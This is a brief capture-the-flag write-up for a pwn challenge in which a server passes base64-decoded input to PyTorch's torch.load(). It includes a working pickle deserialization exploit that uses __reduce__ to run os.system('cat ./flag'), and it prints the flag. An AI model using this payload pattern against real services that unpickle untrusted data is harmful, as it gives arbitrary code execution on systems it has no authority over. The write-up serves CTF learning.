# memecontrol - pwn

I have no idea what the code does. All I know is it decodes the base64 input then pass it to `torch.load()` function

> torch.load() unless weights_only parameter is set to True, uses pickle module implicitly, which is known to be insecure. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never load data that could have come from an untrusted source in an unsafe mode, or that could have been tampered with. Only load data you trust.

PyTorch uses `pickle` to decerialize the data. We all know `pickle` is vulnerable decerialization attack. We can construct malicious pickle data which will execute arbitrary code on the server.

### Exploit: 

```py
# Copied from https://davidhamann.de/2020/04/05/exploiting-python-pickle/
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('cat ./flag')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

Flag: `midnight{backd00r5_ar3_c00l_wh3n_th3Y_ar3_yoUR5}`